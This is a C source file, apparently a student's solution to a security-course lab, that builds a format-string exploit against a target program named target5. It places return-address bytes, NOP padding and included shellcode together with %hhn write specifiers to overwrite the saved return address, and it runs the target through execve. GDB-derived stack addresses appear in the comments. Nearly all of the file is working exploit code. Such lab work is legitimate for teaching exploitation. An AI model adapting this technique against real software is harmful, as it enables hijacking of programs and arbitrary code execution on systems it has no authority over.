#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

//const char * payload = "%08x%08x%08x%08x%08x%hhn"; 

int main(void)
{
  char *args[3];
  char *env[17];

  args[0] = TARGET;

  /* INFO FROM GDB:
   *    
   *        % info frame (of foo)
   * 		Arglist at 0x2021fe60, args: arg=0x7fffffffeedd "\230\376! "
   * 		Locals at 0x2021fe60, Previous frame's sp is 0x2021fe70
   * 		Saved registers:
   * 		rbp at 0x2021fe60, rip at 0x2021fe68
   *
   * 	    % x /x buf
   * 	    	0x2021fa60
   *
   * 	    Address of shellcode = buf + 56 = 0x20211a98
   *
   * 	    RA: 0x2021fe68, RA+1: 0x2021fe69, RA+2: 0z2021fe6a, RA+3: 0x2021fe6b
   *
   * 	    Acc. to lecture slide, we want <RA><DUMMY NOP><RA+1><DUMMY NOP><RA+2><DUMMY NOP><RA+3><SHELLCODE><%x%hhn...>
   */	


	char exploit[256] = {0};
	strcat(exploit, "\x68\xfe\x21\x20\x00\x00\x00\x00");
	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
	strcat(exploit, "\x69\xfe\x21\x20\x00\x00\x00\x00");
	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
	strcat(exploit, "\x6a\xfe\x21\x20\x00\x00\x00\x00");
	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
  	strcat(exploit, "\x6b\xfe\x21\x20\x00\x00\x00\x00");

  	strcat(exploit, shellcode);

	// snprintf already used 41 bytes	
	// Want to write 0x98, 0x1a, 0x21, 0x20
	//
	// The difference between current stack pointer (0x20221950)
	//  and the start address of freeString (0x20221960) is 16
	//  bytes. Hence, there are two words in between.

	strcat(exploit, "%8x%8x%79d%hhn");	// 152-41-16
	strcat(exploit, "%130d%hhn");	// 26 - 152 + 256 = 130
	strcat(exploit, "%7d%hhn");	// 33 - 26 = 7
	strcat(exploit, "%1d%hhn");	// 34 - 33 = 1
	
	int len = strlen(exploit);
	int j;
	for (j = 0; j < 256 - len; j++){
		exploit[len+j] = '\x90';
	}

  args[1] = exploit;
  args[2] = NULL;  

    env[0] = &exploit[4];
    env[1] = &exploit[5];
    env[2] = &exploit[6];
    env[3] = &exploit[7];
    env[4] = &exploit[20];
    env[5] = &exploit[21];
    env[6] = &exploit[22];
    env[7] = &exploit[23];
    env[8] = &exploit[36];
    env[9] = &exploit[37];
    env[10] = &exploit[38];
    env[11] = &exploit[39];
    env[12] = &exploit[52];
    env[13] = &exploit[53];
    env[14] = &exploit[54];
    env[15] = &exploit[55];
    env[16] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
